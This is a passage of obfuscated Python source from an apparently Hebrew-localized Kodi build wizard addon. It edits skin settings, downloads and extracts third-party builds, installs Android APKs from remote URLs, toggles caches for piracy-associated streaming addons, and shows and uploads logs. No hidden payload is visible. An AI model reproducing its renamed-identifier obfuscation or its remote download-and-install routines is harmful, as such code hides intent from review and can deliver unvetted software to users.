			O00OOOOO0OOOOOO00 =re .compile (OO0OO0OO000OOOOOO ).findall (O0OO0OO00OO0OO0OO )[0 ]#line:4286
			OOO0OO0OOOOOO00OO =open (O0OOOO00OO00O0OO0 ,'w')#line:4287
			OOO0OO0OOOOOO00OO .write (O0OO0OO00OO0OO0OO .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O00OOOOO0OOOOOO00 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4288
			OOO0OO0OOOOOO00OO .close ()#line:4289
			O0OOOO00OO00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4293
			OOO0OO0OOOOOO00OO =open (O0OOOO00OO00O0OO0 ,'r')#line:4295
			O0OO0OO00OO0OO0OO =OOO0OO0OOOOOO00OO .read ()#line:4296
			OOO0OO0OOOOOO00OO .close ()#line:4297
			OO0OO0OO000OOOOOO ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4298
			O00OOOOO0OOOOOO00 =re .compile (OO0OO0OO000OOOOOO ).findall (O0OO0OO00OO0OO0OO )[0 ]#line:4299
			OOO0OO0OOOOOO00OO =open (O0OOOO00OO00O0OO0 ,'w')#line:4300
			OOO0OO0OOOOOO00OO .write (O0OO0OO00OO0OO0OO .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O00OOOOO0OOOOOO00 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4301
			OOO0OO0OOOOOO00OO .close ()#line:4302
			O0OOOO00OO00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4306
			OOO0OO0OOOOOO00OO =open (O0OOOO00OO00O0OO0 ,'r')#line:4308
			O0OO0OO00OO0OO0OO =OOO0OO0OOOOOO00OO .read ()#line:4309
			OOO0OO0OOOOOO00OO .close ()#line:4310
			OO0OO0OO000OOOOOO ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4311
			O00OOOOO0OOOOOO00 =re .compile (OO0OO0OO000OOOOOO ).findall (O0OO0OO00OO0OO0OO )[0 ]#line:4312
			OOO0OO0OOOOOO00OO =open (O0OOOO00OO00O0OO0 ,'w')#line:4313
			OOO0OO0OOOOOO00OO .write (O0OO0OO00OO0OO0OO .replace ('<setting id="show.cdart" type="bool%s/setting>'%O00OOOOO0OOOOOO00 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4314
			OOO0OO0OOOOOO00OO .close ()#line:4315
			O0OOOO00OO00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4319
			OOO0OO0OOOOOO00OO =open (O0OOOO00OO00O0OO0 ,'r')#line:4321
			O0OO0OO00OO0OO0OO =OOO0OO0OOOOOO00OO .read ()#line:4322
			OOO0OO0OOOOOO00OO .close ()#line:4323
			OO0OO0OO000OOOOOO ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4324
			O00OOOOO0OOOOOO00 =re .compile (OO0OO0OO000OOOOOO ).findall (O0OO0OO00OO0OO0OO )[0 ]#line:4325
			OOO0OO0OOOOOO00OO =open (O0OOOO00OO00O0OO0 ,'w')#line:4326
			OOO0OO0OOOOOO00OO .write (O0OO0OO00OO0OO0OO .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O00OOOOO0OOOOOO00 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4327
			OOO0OO0OOOOOO00OO .close ()#line:4328
		except :#line:4333
			pass #line:4334
def thirdPartyInstall (O0OOO000OO0OO0O00 ,OOO0OO000O0O00OOO ):#line:4336
	if not wiz .workingURL (OOO0OO000O0O00OOO ):#line:4337
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4338
	OO0O0OOOOOOO0O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO000OO0OO0O00 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4339
	if OO0O0OOOOOOO0O0O0 ==1 :#line:4340
		freshStart ('third',True )#line:4341
	wiz .clearS ('build')#line:4342
	O00O00O0OOOOOOOOO =O0OOO000OO0OO0O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4343
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4344
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO000OO0OO0O00 ),'','אנא המתן')#line:4345
	O0000O0OOOO00O0OO =os .path .join (PACKAGES ,'%s.zip'%O00O00O0OOOOOOOOO )#line:4346
	try :os .remove (O0000O0OOOO00O0OO )#line:4347
	except :pass #line:4348
	downloader .download (OOO0OO000O0O00OOO ,O0000O0OOOO00O0OO ,DP )#line:4349
	xbmc .sleep (1000 )#line:4350
	OOOOOOO000OOOOO00 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO000OO0OO0O00 )#line:4351
	DP .update (0 ,OOOOOOO000OOOOO00 ,'','אנא המתן')#line:4352
	O0OO0000000O0OOO0 ,OOO0O000OOO000000 ,O0OOOOO0O0OO0000O =extract .all (O0000O0OOOO00O0OO ,HOME ,DP ,title =OOOOOOO000OOOOO00 )#line:4353
	if int (float (O0OO0000000O0OOO0 ))>0 :#line:4354
		wiz .fixmetas ()#line:4355
		wiz .lookandFeelData ('save')#line:4356
		wiz .defaultSkin ()#line:4357
		wiz .setS ('installed','true')#line:4359
		wiz .setS ('extract',str (O0OO0000000O0OOO0 ))#line:4360
		wiz .setS ('errors',str (OOO0O000OOO000000 ))#line:4361
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OO0000000O0OOO0 ,OOO0O000OOO000000 ))#line:4362
		try :os .remove (O0000O0OOOO00O0OO )#line:4363
		except :pass #line:4364
		if int (float (OOO0O000OOO000000 ))>0 :#line:4365
			O0OOO000OOOO00OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO000OO0OO0O00 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0OO0000000O0OOO0 ,'%',COLOR1 ,OOO0O000OOO000000 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4366
			if O0OOO000OOOO00OOO :#line:4367
				if isinstance (OOO0O000OOO000000 ,unicode ):#line:4368
					O0OOOOO0O0OO0000O =O0OOOOO0O0OO0000O .encode ('utf-8')#line:4369
				wiz .TextBox (ADDONTITLE ,O0OOOOO0O0OO0000O )#line:4370
	DP .close ()#line:4371
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4372
	if INSTALLMETHOD ==1 :OO000OOOOO0OOOO00 =1 #line:4373
	elif INSTALLMETHOD ==2 :OO000OOOOO0OOOO00 =0 #line:4374
	else :OO000OOOOO0OOOO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4375
	if OO000OOOOO0OOOO00 ==1 :wiz .reloadFix ()#line:4376
	else :wiz .killxbmc (True )#line:4377
def testTheme (O0OO0O0OOO0OO00OO ):#line:4379
	OO000OO0OOO00OOOO =zipfile .ZipFile (O0OO0O0OOO0OO00OO )#line:4380
	for OOOOOOOO00000O00O in OO000OO0OOO00OOOO .infolist ():#line:4381
		if '/settings.xml'in OOOOOOOO00000O00O .filename :#line:4382
			return True #line:4383
	return False #line:4384
def testGui (O0OOOOOO00OOO00OO ):#line:4386
	OOO000OOOO00O0O0O =zipfile .ZipFile (O0OOOOOO00OOO00OO )#line:4387
	for O00O000OO000O0O00 in OOO000OOOO00O0O0O .infolist ():#line:4388
		if '/guisettings.xml'in O00O000OO000O0O00 .filename :#line:4389
			return True #line:4390
	return False #line:4391
def apkInstaller (OOOOOO0000OO0OOOO ,OOO00OO0OOO0000O0 ):#line:4393
	wiz .log (OOOOOO0000OO0OOOO )#line:4394
	wiz .log (OOO00OO0OOO0000O0 )#line:4395
	if wiz .platform ()=='android':#line:4396
		O000O000OOOO00OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOO0000OO0OOOO ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4397
		if not O000O000OOOO00OO0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4398
		OO00OOO0OO00O0000 =OOOOOO0000OO0OOOO #line:4399
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4400
		if not wiz .workingURL (OOO00OO0OOO0000O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4401
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOO0OO00O0000 ),'','אנא המתן')#line:4402
		OOOO0O0O000OO0O0O =os .path .join (PACKAGES ,"%s.apk"%OOOOOO0000OO0OOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4403
		try :os .remove (OOOO0O0O000OO0O0O )#line:4404
		except :pass #line:4405
		downloader .download (OOO00OO0OOO0000O0 ,OOOO0O0O000OO0O0O ,DP )#line:4406
		xbmc .sleep (100 )#line:4407
		DP .close ()#line:4408
		notify .apkInstaller (OOOOOO0000OO0OOOO )#line:4409
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OOOO0O0O000OO0O0O +'")')#line:4410
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4411
def createMenu (OO0OO00000O0OOOO0 ,OOOO0000O000O000O ,OOOOOO00O0OOO000O ):#line:4417
	if OO0OO00000O0OOOO0 =='saveaddon':#line:4418
		O0O0OOO0O0O000OOO =[]#line:4419
		OO0O0O0OO000O000O =urllib .quote_plus (OOOO0000O000O000O .lower ().replace (' ',''))#line:4420
		O000OOO0OOOOOOO00 =OOOO0000O000O000O .replace ('Debrid','Real Debrid')#line:4421
		O0O0O0000OOO0OO0O =urllib .quote_plus (OOOOOO00O0OOO000O .lower ().replace (' ',''))#line:4422
		OOOOOO00O0OOO000O =OOOOOO00O0OOO000O .replace ('url','URL Resolver')#line:4423
		O0O0OOO0O0O000OOO .append ((THEME2 %OOOOOO00O0OOO000O .title (),' '))#line:4424
		O0O0OOO0O0O000OOO .append ((THEME3 %'Save %s Data'%O000OOO0OOOOOOO00 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO0O0O0OO000O000O ,O0O0O0000OOO0OO0O )))#line:4425
		O0O0OOO0O0O000OOO .append ((THEME3 %'Restore %s Data'%O000OOO0OOOOOOO00 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO0O0O0OO000O000O ,O0O0O0000OOO0OO0O )))#line:4426
		O0O0OOO0O0O000OOO .append ((THEME3 %'Clear %s Data'%O000OOO0OOOOOOO00 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OO0O0O0OO000O000O ,O0O0O0000OOO0OO0O )))#line:4427
	elif OO0OO00000O0OOOO0 =='save':#line:4428
		O0O0OOO0O0O000OOO =[]#line:4429
		OO0O0O0OO000O000O =urllib .quote_plus (OOOO0000O000O000O .lower ().replace (' ',''))#line:4430
		O000OOO0OOOOOOO00 =OOOO0000O000O000O .replace ('Debrid','Real Debrid')#line:4431
		O0O0O0000OOO0OO0O =urllib .quote_plus (OOOOOO00O0OOO000O .lower ().replace (' ',''))#line:4432
		OOOOOO00O0OOO000O =OOOOOO00O0OOO000O .replace ('url','URL Resolver')#line:4433
		O0O0OOO0O0O000OOO .append ((THEME2 %OOOOOO00O0OOO000O .title (),' '))#line:4434
		O0O0OOO0O0O000OOO .append ((THEME3 %'Register %s'%O000OOO0OOOOOOO00 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OO0O0O0OO000O000O ,O0O0O0000OOO0OO0O )))#line:4435
		O0O0OOO0O0O000OOO .append ((THEME3 %'Save %s Data'%O000OOO0OOOOOOO00 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO0O0O0OO000O000O ,O0O0O0000OOO0OO0O )))#line:4436
		O0O0OOO0O0O000OOO .append ((THEME3 %'Restore %s Data'%O000OOO0OOOOOOO00 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO0O0O0OO000O000O ,O0O0O0000OOO0OO0O )))#line:4437
		O0O0OOO0O0O000OOO .append ((THEME3 %'Import %s Data'%O000OOO0OOOOOOO00 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OO0O0O0OO000O000O ,O0O0O0000OOO0OO0O )))#line:4438
		O0O0OOO0O0O000OOO .append ((THEME3 %'Clear Addon %s Data'%O000OOO0OOOOOOO00 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OO0O0O0OO000O000O ,O0O0O0000OOO0OO0O )))#line:4439
	elif OO0OO00000O0OOOO0 =='install':#line:4440
		O0O0OOO0O0O000OOO =[]#line:4441
		O0O0O0000OOO0OO0O =urllib .quote_plus (OOOOOO00O0OOO000O )#line:4442
		O0O0OOO0O0O000OOO .append ((THEME2 %OOOOOO00O0OOO000O ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0O0O0000OOO0OO0O )))#line:4443
		O0O0OOO0O0O000OOO .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0O0O0000OOO0OO0O )))#line:4444
		O0O0OOO0O0O000OOO .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0O0O0000OOO0OO0O )))#line:4445
		O0O0OOO0O0O000OOO .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0O0O0000OOO0OO0O )))#line:4446
		O0O0OOO0O0O000OOO .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0O0O0000OOO0OO0O )))#line:4447
	O0O0OOO0O0O000OOO .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4448
	return O0O0OOO0O0O000OOO #line:4449
def toggleCache (OO000000O000000O0 ):#line:4451
	O0O0O000OO00OOOOO =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4452
	O0O0OOO0OOOO000OO =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4453
	if OO000000O000000O0 in ['true','false']:#line:4454
		for O0O000OOOOO0OO00O in O0O0O000OO00OOOOO :#line:4455
			wiz .setS (O0O000OOOOO0OO00O ,OO000000O000000O0 )#line:4456
	else :#line:4457
		if not OO000000O000000O0 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4458
			try :#line:4459
				O0O000OOOOO0OO00O =O0O0OOO0OOOO000OO [O0O0O000OO00OOOOO .index (OO000000O000000O0 )]#line:4460
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O0O000OOOOO0OO00O ))#line:4461
			except :#line:4462
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO000000O000000O0 ))#line:4463
		else :#line:4464
			O0O0O0O0OOOOO0000 ='true'if wiz .getS (OO000000O000000O0 )=='false'else 'false'#line:4465
			wiz .setS (OO000000O000000O0 ,O0O0O0O0OOOOO0000 )#line:4466
def playVideo (O0O000O0OO00OO00O ):#line:4468
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O0O000O0OO00OO00O )#line:4469
	if 'watch?v='in O0O000O0OO00OO00O :#line:4470
		OOOOOO0O0OOO0OOOO ,OO000OO00000OOO0O =O0O000O0OO00OO00O .split ('?')#line:4471
		O0OOO00O00O0OO0O0 =OO000OO00000OOO0O .split ('&')#line:4472
		for O000000O00OOOOOOO in O0OOO00O00O0OO0O0 :#line:4473
			if O000000O00OOOOOOO .startswith ('v='):#line:4474
				O0O000O0OO00OO00O =O000000O00OOOOOOO [2 :]#line:4475
				break #line:4476
			else :continue #line:4477
	elif 'embed'in O0O000O0OO00OO00O or 'youtu.be'in O0O000O0OO00OO00O :#line:4478
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O0O000O0OO00OO00O )#line:4479
		OOOOOO0O0OOO0OOOO =O0O000O0OO00OO00O .split ('/')#line:4480
		if len (OOOOOO0O0OOO0OOOO [-1 ])>5 :#line:4481
			O0O000O0OO00OO00O =OOOOOO0O0OOO0OOOO [-1 ]#line:4482
		elif len (OOOOOO0O0OOO0OOOO [-2 ])>5 :#line:4483
			O0O000O0OO00OO00O =OOOOOO0O0OOO0OOOO [-2 ]#line:4484
	wiz .log ("YouTube URL: %s"%O0O000O0OO00OO00O )#line:4485
	yt .PlayVideo (O0O000O0OO00OO00O )#line:4486
def viewLogFile ():#line:4488
	OO0O0O0OO000O0000 =wiz .Grab_Log (True )#line:4489
	O0OOOOOO0OOOOO000 =wiz .Grab_Log (True ,True )#line:4490
	O0O00O0OOO0O00OOO =0 ;O000O0O0OOOOO0O00 =OO0O0O0OO000O0000 #line:4491
	if not O0OOOOOO0OOOOO000 ==False and not OO0O0O0OO000O0000 ==False :#line:4492
		O0O00O0OOO0O00OOO =DIALOG .select (ADDONTITLE ,["View %s"%OO0O0O0OO000O0000 .replace (LOG ,""),"View %s"%O0OOOOOO0OOOOO000 .replace (LOG ,"")])#line:4493
		if O0O00O0OOO0O00OOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4494
	elif OO0O0O0OO000O0000 ==False and O0OOOOOO0OOOOO000 ==False :#line:4495
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4496
		return #line:4497
	elif not OO0O0O0OO000O0000 ==False :O0O00O0OOO0O00OOO =0 #line:4498
	elif not O0OOOOOO0OOOOO000 ==False :O0O00O0OOO0O00OOO =1 #line:4499
	O000O0O0OOOOO0O00 =OO0O0O0OO000O0000 if O0O00O0OOO0O00OOO ==0 else O0OOOOOO0OOOOO000 #line:4501
	OOOOO00000O00OO00 =wiz .Grab_Log (False )if O0O00O0OOO0O00OOO ==0 else wiz .Grab_Log (False ,True )#line:4502
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O000O0O0OOOOO0O00 ),OOOOO00000O00OO00 )#line:4504
def errorChecking (log =None ,count =None ,all =None ):#line:4506
	if log ==None :#line:4507
		O0O0O0O00O000OOO0 =wiz .Grab_Log (True )#line:4508
		O0000000O0OOOO0OO =wiz .Grab_Log (True ,True )#line:4509
		if not O0000000O0OOOO0OO ==False and not O0O0O0O00O000OOO0 ==False :#line:4510
			OO0O0000OO00OO0OO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0O0O0O00O000OOO0 .replace (LOG ,""),errorChecking (O0O0O0O00O000OOO0 ,True ,True )),"View %s: %s error(s)"%(O0000000O0OOOO0OO .replace (LOG ,""),errorChecking (O0000000O0OOOO0OO ,True ,True ))])#line:4511
			if OO0O0000OO00OO0OO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4512
		elif O0O0O0O00O000OOO0 ==False and O0000000O0OOOO0OO ==False :#line:4513
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4514
			return #line:4515
		elif not O0O0O0O00O000OOO0 ==False :OO0O0000OO00OO0OO =0 #line:4516
		elif not O0000000O0OOOO0OO ==False :OO0O0000OO00OO0OO =1 #line:4517
		log =O0O0O0O00O000OOO0 if OO0O0000OO00OO0OO ==0 else O0000000O0OOOO0OO #line:4518
	if log ==False :#line:4519
		if count ==None :#line:4520
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4521
			return False #line:4522
		else :#line:4523
			return 0 #line:4524
	else :#line:4525
		if os .path .exists (log ):#line:4526
			OOO0O0OO0O00000OO =open (log ,mode ='r');O00OO0O0OO0OO000O =OOO0O0OO0O00000OO .read ().replace ('\n','').replace ('\r','');OOO0O0OO0O00000OO .close ()#line:4527
			O0O000OOO0OOO00OO =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O00OO0O0OO0OO000O )#line:4528
			if not count ==None :#line:4529
				if all ==None :#line:4530
					O0OOOO0OOO000O00O =0 #line:4531
					for O0OOOOOOO0O0000OO in O0O000OOO0OOO00OO :#line:4532
						if ADDON_ID in O0OOOOOOO0O0000OO :O0OOOO0OOO000O00O +=1 #line:4533
					return O0OOOO0OOO000O00O #line:4534
				else :return len (O0O000OOO0OOO00OO )#line:4535
			if len (O0O000OOO0OOO00OO )>0 :#line:4536
				O0OOOO0OOO000O00O =0 ;O00O0000O000OO000 =""#line:4537
				for O0OOOOOOO0O0000OO in O0O000OOO0OOO00OO :#line:4538
					if all ==None and not ADDON_ID in O0OOOOOOO0O0000OO :continue #line:4539
					else :#line:4540
						O0OOOO0OOO000O00O +=1 #line:4541
						O00O0000O000OO000 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0OOOO0OOO000O00O ,O0OOOOOOO0O0000OO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4542
				if O0OOOO0OOO000O00O >0 :#line:4543
					wiz .TextBox (ADDONTITLE ,O00O0000O000OO000 )#line:4544
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4545
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4546
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4547
ACTION_PREVIOUS_MENU =10 #line:4549
ACTION_NAV_BACK =92 #line:4550
ACTION_MOVE_LEFT =1 #line:4551
ACTION_MOVE_RIGHT =2 #line:4552
ACTION_MOVE_UP =3 #line:4553
ACTION_MOVE_DOWN =4 #line:4554
ACTION_MOUSE_WHEEL_UP =104 #line:4555
ACTION_MOUSE_WHEEL_DOWN =105 #line:4556
ACTION_MOVE_MOUSE =107 #line:4557
ACTION_SELECT_ITEM =7 #line:4558
ACTION_BACKSPACE =110 #line:4559
ACTION_MOUSE_LEFT_CLICK =100 #line:4560
ACTION_MOUSE_LONG_CLICK =108 #line:4561
def LogViewer (default =None ):#line:4563
	class OO0O000O00OOO0OOO (xbmcgui .WindowXMLDialog ):#line:4564
		def __init__ (OO0O0000OOO0O0OO0 ,*OO000000O0O0OOOOO ,**O00O000000O0O0000 ):#line:4565
			OO0O0000OOO0O0OO0 .default =O00O000000O0O0000 ['default']#line:4566
		def onInit (O0000O00O00OO0OO0 ):#line:4568
			O0000O00O00OO0OO0 .title =101 #line:4569
			O0000O00O00OO0OO0 .msg =102 #line:4570
			O0000O00O00OO0OO0 .scrollbar =103 #line:4571
			O0000O00O00OO0OO0 .upload =201 #line:4572
			O0000O00O00OO0OO0 .kodi =202 #line:4573
			O0000O00O00OO0OO0 .kodiold =203 #line:4574
			O0000O00O00OO0OO0 .wizard =204 #line:4575
			O0000O00O00OO0OO0 .okbutton =205 #line:4576
			O0OO0OO0OO0OO000O =open (O0000O00O00OO0OO0 .default ,'r')#line:4577
			O0000O00O00OO0OO0 .logmsg =O0OO0OO0OO0OO000O .read ()#line:4578
			O0OO0OO0OO0OO000O .close ()#line:4579
			O0000O00O00OO0OO0 .titlemsg ="%s: %s"%(ADDONTITLE ,O0000O00O00OO0OO0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4580
			O0000O00O00OO0OO0 .showdialog ()#line:4581
		def showdialog (O00000OO0O0OO00OO ):#line:4583
			O00000OO0O0OO00OO .getControl (O00000OO0O0OO00OO .title ).setLabel (O00000OO0O0OO00OO .titlemsg )#line:4584
			O00000OO0O0OO00OO .getControl (O00000OO0O0OO00OO .msg ).setText (wiz .highlightText (O00000OO0O0OO00OO .logmsg ))#line:4585
			O00000OO0O0OO00OO .setFocusId (O00000OO0O0OO00OO .scrollbar )#line:4586
		def onClick (O0OO0O0O0000O0OOO ,O0O0OOO0000O00O00 ):#line:4588
			if O0O0OOO0000O00O00 ==O0OO0O0O0000O0OOO .okbutton :O0OO0O0O0000O0OOO .close ()#line:4589
			elif O0O0OOO0000O00O00 ==O0OO0O0O0000O0OOO .upload :O0OO0O0O0000O0OOO .close ();uploadLog .Main ()#line:4590
			elif O0O0OOO0000O00O00 ==O0OO0O0O0000O0OOO .kodi :#line:4591
				O0000O00000000O0O =wiz .Grab_Log (False )#line:4592
				OOO00000000O0OO0O =wiz .Grab_Log (True )#line:4593
				if O0000O00000000O0O ==False :#line:4594
					O0OO0O0O0000O0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4595
					O0OO0O0O0000O0OOO .getControl (O0OO0O0O0000O0OOO .msg ).setText ("Log File Does Not Exists!")#line:4596
				else :#line:4597
					O0OO0O0O0000O0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,OOO00000000O0OO0O .replace (LOG ,''))#line:4598
					O0OO0O0O0000O0OOO .getControl (O0OO0O0O0000O0OOO .title ).setLabel (O0OO0O0O0000O0OOO .titlemsg )#line:4599
					O0OO0O0O0000O0OOO .getControl (O0OO0O0O0000O0OOO .msg ).setText (wiz .highlightText (O0000O00000000O0O ))#line:4600
					O0OO0O0O0000O0OOO .setFocusId (O0OO0O0O0000O0OOO .scrollbar )#line:4601
			elif O0O0OOO0000O00O00 ==O0OO0O0O0000O0OOO .kodiold :#line:4602
				O0000O00000000O0O =wiz .Grab_Log (False ,True )#line:4603
				OOO00000000O0OO0O =wiz .Grab_Log (True ,True )#line:4604
				if O0000O00000000O0O ==False :#line:4605
					O0OO0O0O0000O0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4606
					O0OO0O0O0000O0OOO .getControl (O0OO0O0O0000O0OOO .msg ).setText ("Log File Does Not Exists!")#line:4607
				else :#line:4608
					O0OO0O0O0000O0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,OOO00000000O0OO0O .replace (LOG ,''))#line:4609
					O0OO0O0O0000O0OOO .getControl (O0OO0O0O0000O0OOO .title ).setLabel (O0OO0O0O0000O0OOO .titlemsg )#line:4610
					O0OO0O0O0000O0OOO .getControl (O0OO0O0O0000O0OOO .msg ).setText (wiz .highlightText (O0000O00000000O0O ))#line:4611
					O0OO0O0O0000O0OOO .setFocusId (O0OO0O0O0000O0OOO .scrollbar )#line:4612
			elif O0O0OOO0000O00O00 ==O0OO0O0O0000O0OOO .wizard :#line:4613
				O0000O00000000O0O =wiz .Grab_Log (False ,False ,True )#line:4614
				OOO00000000O0OO0O =wiz .Grab_Log (True ,False ,True )#line:4615
				if O0000O00000000O0O ==False :#line:4616
					O0OO0O0O0000O0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4617
					O0OO0O0O0000O0OOO .getControl (O0OO0O0O0000O0OOO .msg ).setText ("Log File Does Not Exists!")#line:4618
				else :#line:4619
					O0OO0O0O0000O0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,OOO00000000O0OO0O .replace (ADDONDATA ,''))#line:4620
